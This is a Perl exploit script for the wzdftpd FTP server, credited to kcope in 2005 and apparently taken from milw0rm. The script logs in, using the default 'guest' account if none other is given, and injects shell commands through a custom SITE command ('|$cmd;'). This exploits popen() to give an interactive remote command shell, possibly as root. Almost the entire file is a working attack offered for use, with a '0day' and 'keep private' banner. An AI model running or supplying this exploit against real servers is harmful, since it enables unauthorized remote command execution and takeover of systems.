######################################################
# 0day0day0day0day0day0day0day
# -------------------------------
# wzdftpd remote exploit by kcope
# nice call to popen(3) on custom 
# site commands...
#
# August 2005
# confidential! keep private!
# -------------------------------
# 0day0day0day0day0day0day0day
#
#                    .___ _____  __             .___
#__  _  __________ __| _// ____\/  |_______   __| _/
#\ \/ \/ /\___   // __ |\   __\\   __\____ \ / __ | 
# \     /  /    // /_/ | |  |   |  | |  |_> > /_/ | 
#  \/\_/  /_____ \____ | |__|   |__| |   __/\____ | 
#               \/    \/             |__|        \/ 
#                                      
#__  _  _______ _______   ____ ________
#\ \/ \/ /\__  \\_  __ \_/ __ \\___   /
# \     /  / __ \|  | \/\  ___/ /    / 
#  \/\_/  (____  /__|    \___  >_____ \
#              \/            \/      \/ VER1
######################################################

use Net::FTP;

sub usage {
	print "usage: wzdftpdwarez.pl remote_host remote_port user pass custom_site_command\n"
	     ."default guest account for wzdftpd is username/password: guest/%\n";
}

print "
wzdftpd remote exploit by kcope
August 2005
confidential! keep private!

";

if ($#ARGV < 4) {
	usage();
	exit();	 
}

$host = $ARGV[0];
$port = $ARGV[1];
$user = $ARGV[2];
$pass = $ARGV[3];
$sitecmd = $ARGV[4];

$ftp = Net::FTP->new(Host => $host, Port => $port, Debug => 0)
     or die "Cannot connect to $host: $@";

$ftp->login($user, $pass)
     or die "Cannot login ", $ftp->message;
     
print "Now you can type commands, hopefully as r00t!\n";
while(1) {
	print "!\$%&#>";
	$cmd=<stdin>;
	$ftp->site($sitecmd, "|$cmd;");
	print $ftp->message();
}

# milw0rm.com [2005-09-24]
